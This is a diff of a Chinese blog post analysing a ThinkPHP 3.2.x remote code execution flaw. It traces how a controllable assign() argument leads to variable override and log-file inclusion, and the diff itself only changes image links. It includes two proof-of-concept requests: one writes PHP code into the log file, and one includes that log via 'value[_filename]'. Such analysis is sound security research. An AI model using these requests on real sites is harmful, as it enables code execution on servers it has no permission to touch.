@@ -236,43 +236,43 @@
 
 <p>新建文件，内容随意</p>
 <p>/Application/Home/View/Index/index.html</p>
-<p><a href="https://imgtu.com/i/WksqJS"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksqJS.png" srcset="/img/loading.gif" lazyload alt="WksqJS.png"></a></p>
+<p><a href="https://imgtu.com/i/WksqJS"><img src="https://z3.ax1x.com/2021/07/13/WksqJS.png" srcset="/img/loading.gif" lazyload alt="WksqJS.png"></a></p>
 <h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>利用条件：assign方法的第一个变量可控。</p>
 <p>向日志文件写入攻击代码</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?m=<span class="hljs-comment">--&gt;&lt;?=phpinfo();?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><a href="https://imgtu.com/i/WksWxH"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksWxH.png" srcset="/img/loading.gif" lazyload alt="WksWxH.png"></a></p>
+<p><a href="https://imgtu.com/i/WksWxH"><img src="https://z3.ax1x.com/2021/07/13/WksWxH.png" srcset="/img/loading.gif" lazyload alt="WksWxH.png"></a></p>
 <p>包含日志文件，日志文件的命名规则为<code>年_月_日.log</code></p>
 <figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-meta">index</span>.php?m=Home<span class="hljs-variable">&amp;c</span>=<span class="hljs-meta">Index</span><span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">index</span><span class="hljs-variable">&amp;value</span>[_filename]=./Application/Runtime/Logs/Common/21_07_12.log<br></code></pre></td></tr></table></figure>
 
-<p><a href="https://imgtu.com/i/WksRRe"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksRRe.png" srcset="/img/loading.gif" lazyload alt="WksRRe.png"></a></p>
+<p><a href="https://imgtu.com/i/WksRRe"><img src="https://z3.ax1x.com/2021/07/13/WksRRe.png" srcset="/img/loading.gif" lazyload alt="WksRRe.png"></a></p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>先进入assign方法</p>
-<p><a href="https://imgtu.com/i/WksgPO"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksgPO.png" srcset="/img/loading.gif" lazyload alt="WksgPO.png"></a></p>
+<p><a href="https://imgtu.com/i/WksgPO"><img src="https://z3.ax1x.com/2021/07/13/WksgPO.png" srcset="/img/loading.gif" lazyload alt="WksgPO.png"></a></p>
 <p>把assign方法的第一个参数赋值给$this-&gt;tVar</p>
-<p><a href="https://imgtu.com/i/Wks6IK"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wks6IK.png" srcset="/img/loading.gif" lazyload alt="Wks6IK.png"></a></p>
+<p><a href="https://imgtu.com/i/Wks6IK"><img src="https://z3.ax1x.com/2021/07/13/Wks6IK.png" srcset="/img/loading.gif" lazyload alt="Wks6IK.png"></a></p>
 <p><code>ThinkPHP/Library/Think/View.class.php</code></p>
 <p>assign方法结束后进入display</p>
-<p><a href="https://imgtu.com/i/Wks2GD"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wks2GD.png" srcset="/img/loading.gif" lazyload alt="Wks2GD.png"></a></p>
+<p><a href="https://imgtu.com/i/Wks2GD"><img src="https://z3.ax1x.com/2021/07/13/Wks2GD.png" srcset="/img/loading.gif" lazyload alt="Wks2GD.png"></a></p>
 <p><code>ThinkPHP/Library/Think/View.class.php#fetch</code></p>
 <p>进入fetch方法，因为模板文件名为空，所以先调用parseTemplate获取默认模板文件（./Application/Home/View/Index/index.html），也就是之前新建的文件。</p>
-<p><a href="https://imgtu.com/i/Wks5qI"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wks5qI.png" srcset="/img/loading.gif" lazyload alt="Wks5qI.png"></a></p>
+<p><a href="https://imgtu.com/i/Wks5qI"><img src="https://z3.ax1x.com/2021/07/13/Wks5qI.png" srcset="/img/loading.gif" lazyload alt="Wks5qI.png"></a></p>
 <p>然后构造了params数组，包含了传入的value数组和默认模板文件名</p>
-<p><a href="https://imgtu.com/i/WksoZt"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksoZt.png" srcset="/img/loading.gif" lazyload alt="WksoZt.png"></a></p>
+<p><a href="https://imgtu.com/i/WksoZt"><img src="https://z3.ax1x.com/2021/07/13/WksoZt.png" srcset="/img/loading.gif" lazyload alt="WksoZt.png"></a></p>
 <p><code>/ThinkPHP/Library/Think/Hook.class.php</code></p>
 <p>进入exec</p>
-<p><a href="https://imgtu.com/i/WksTdP"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksTdP.png" srcset="/img/loading.gif" lazyload alt="WksTdP.png"></a></p>
+<p><a href="https://imgtu.com/i/WksTdP"><img src="https://z3.ax1x.com/2021/07/13/WksTdP.png" srcset="/img/loading.gif" lazyload alt="WksTdP.png"></a></p>
 <p><code>/ThinkPHP/Library/Think/Hook.class.php</code></p>
 <p>实际调用Behavior\ParseTemplateBehavior-&gt;run，把params数组作为参数</p>
-<p><a href="https://imgtu.com/i/Wks7If"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wks7If.png" srcset="/img/loading.gif" lazyload alt="Wks7If.png"></a></p>
+<p><a href="https://imgtu.com/i/Wks7If"><img src="https://z3.ax1x.com/2021/07/13/Wks7If.png" srcset="/img/loading.gif" lazyload alt="Wks7If.png"></a></p>
 <p><code>/ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code></p>
 <p>调用fetch</p>
-<p><a href="https://imgtu.com/i/WksLRg"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksLRg.png" srcset="/img/loading.gif" lazyload alt="WksLRg.png"></a></p>
+<p><a href="https://imgtu.com/i/WksLRg"><img src="https://z3.ax1x.com/2021/07/13/WksLRg.png" srcset="/img/loading.gif" lazyload alt="WksLRg.png"></a></p>
 <p><code>/ThinkPHP/Library/Think/Template.class.php</code></p>
 <p>获取缓存文件路径，然后进入load方法</p>
-<p><a href="https://imgtu.com/i/Wksbi8"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wksbi8.png" srcset="/img/loading.gif" lazyload alt="Wksbi8.png"></a></p>
+<p><a href="https://imgtu.com/i/Wksbi8"><img src="https://z3.ax1x.com/2021/07/13/Wksbi8.png" srcset="/img/loading.gif" lazyload alt="Wksbi8.png"></a></p>
 <p><code>/ThinkPHP/Library/Think/Storage/Driver/File.class.php</code></p>
 <p>调用extract，将$vars数组作为参数进行变量覆盖。把$_filename覆盖为日志文件名，然后包含日志文件</p>
-<p><a href="https://imgtu.com/i/Wks4sA"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wks4sA.png" srcset="/img/loading.gif" lazyload alt="Wks4sA.png"></a></p>
+<p><a href="https://imgtu.com/i/Wks4sA"><img src="https://z3.ax1x.com/2021/07/13/Wks4sA.png" srcset="/img/loading.gif" lazyload alt="Wks4sA.png"></a></p>
 <p>再回来看看payload，实际上只是传入了一个包含日志文件名的value数组，只需要关注它的流向就可以了</p>
 <figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-meta">index</span>.php?m=Home<span class="hljs-variable">&amp;c</span>=<span class="hljs-meta">Index</span><span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">index</span><span class="hljs-variable">&amp;value</span>[_filename]=./Application/Runtime/Logs/Common/21_07_12.log<br></code></pre></td></tr></table></figure>
 
@@ -281,25 +281,25 @@
 <p><strong>传入的value数组的流向：</strong></p>
 <ol>
 <li><p>在assign()方法中，传入的value数组被赋值给$this-&gt;tVar</p>
-<p><a href="https://imgtu.com/i/Wky9oV"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wky9oV.png" srcset="/img/loading.gif" lazyload alt="Wky9oV.png"></a></p>
+<p><a href="https://imgtu.com/i/Wky9oV"><img src="https://z3.ax1x.com/2021/07/13/Wky9oV.png" srcset="/img/loading.gif" lazyload alt="Wky9oV.png"></a></p>
 </li>
 <li><p>在<code>ThinkPHP/Library/Think/View.class.php#fetch</code>中被赋值给params数组，然后作为第二个参数传给listen</p>
-<p><a href="https://imgtu.com/i/WksOzQ"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksOzQ.png" srcset="/img/loading.gif" lazyload alt="WksOzQ.png"></a></p>
+<p><a href="https://imgtu.com/i/WksOzQ"><img src="https://z3.ax1x.com/2021/07/13/WksOzQ.png" srcset="/img/loading.gif" lazyload alt="WksOzQ.png"></a></p>
 </li>
 <li><p>在<code>/ThinkPHP/Library/Think/Hook.class.php#listen</code>中作为第三个参数传给exec</p>
-<p><a href="https://imgtu.com/i/WksjMj"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksjMj.png" srcset="/img/loading.gif" lazyload alt="WksjMj.png"></a></p>
+<p><a href="https://imgtu.com/i/WksjMj"><img src="https://z3.ax1x.com/2021/07/13/WksjMj.png" srcset="/img/loading.gif" lazyload alt="WksjMj.png"></a></p>
 </li>
 <li><p>在<code>/ThinkPHP/Library/Think/Hook.class.php#exec</code>中调用Behavior\ParseTemplateBehavior-&gt;run，把params数组作为参数</p>
-<p><a href="https://imgtu.com/i/WksxLn"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksxLn.png" srcset="/img/loading.gif" lazyload alt="WksxLn.png"></a></p>
+<p><a href="https://imgtu.com/i/WksxLn"><img src="https://z3.ax1x.com/2021/07/13/WksxLn.png" srcset="/img/loading.gif" lazyload alt="WksxLn.png"></a></p>
 </li>
 <li><p>在<code>/ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php#run</code>中，params[‘value’]也就是value数组被作为第二个参数传入fetch</p>
-<p><a href="https://imgtu.com/i/WkySZq"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WkySZq.png" srcset="/img/loading.gif" lazyload alt="WkySZq.png"></a></p>
+<p><a href="https://imgtu.com/i/WkySZq"><img src="https://z3.ax1x.com/2021/07/13/WkySZq.png" srcset="/img/loading.gif" lazyload alt="WkySZq.png"></a></p>
 </li>
 <li><p>在<code>/ThinkPHP/Library/Think/Template.class.php#fetch</code>中又继续作为第二个参数传入load</p>
-<p><a href="https://imgtu.com/i/Wkypd0"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wkypd0.png" srcset="/img/loading.gif" lazyload alt="Wkypd0.png"></a></p>
+<p><a href="https://imgtu.com/i/Wkypd0"><img src="https://z3.ax1x.com/2021/07/13/Wkypd0.png" srcset="/img/loading.gif" lazyload alt="Wkypd0.png"></a></p>
 </li>
 <li><p>在<code>/ThinkPHP/Library/Think/Storage/Driver/File.class.php#load</code>中进行变量覆盖，最终包含传入value数组中的<code>_filename</code>，执行了向日志文件中写入的代码，实现RCE</p>
-<p><a href="https://imgtu.com/i/Wksvss"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wksvss.png" srcset="/img/loading.gif" lazyload alt="Wksvss.png"></a></p>
+<p><a href="https://imgtu.com/i/Wksvss"><img src="https://z3.ax1x.com/2021/07/13/Wksvss.png" srcset="/img/loading.gif" lazyload alt="Wksvss.png"></a></p>
 </li>
 </ol>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在代码审计知识星球看到了这个新出的漏洞，分析后感觉更适合作为权限维持的后门，实际业务代码中应该很少有这种情况</p>
